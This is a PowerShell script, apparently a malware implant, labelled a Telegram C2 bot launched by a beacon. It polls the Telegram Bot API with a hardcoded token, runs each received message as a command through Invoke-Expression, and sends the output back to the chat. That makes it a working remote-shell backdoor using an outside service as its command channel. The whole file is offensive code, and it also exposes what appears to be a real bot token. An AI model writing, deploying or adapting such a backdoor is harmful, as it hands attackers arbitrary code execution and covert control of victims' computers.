# Telegram C2 Bot — spawned by beacon as background job
$TOKEN='8266214673:AAE8nIglNRjbqYCn2G_SSB02bbuBMEdclEU'
$OFFSET=0

function sd-msg($cid, $txt) {
    try {
        $body=@{chat_id=$cid; text=$txt; parse_mode='HTML'} | ConvertTo-Json -Depth 2 -Compress
        irm -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10
    } catch {}
}

while($true) {
    try {
        $r=irm -Uri "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$OFFSET&timeout=30" -TimeoutSec 35
        if($r.result) {
            foreach($u in $r.result) {
                $OFFSET=$u.update_id+1
                $cid=$u.message.chat.id
                $cmd=$u.message.text.Trim()
                
                if(-not $cmd) { continue }
                
                sd-msg $cid "Running: $cmd"
                try {
                    $out=iex $cmd 2>&1 | Out-String
                } catch {
                    $out="ERROR: $_"
                }
                if($out.Length -gt 3800) { $out=$out.Substring(0,3800) + "...[TRUNCATED]" }
                sd-msg $cid "$out"
            }
        }
    } catch {
        Start-Sleep 5
    }
}
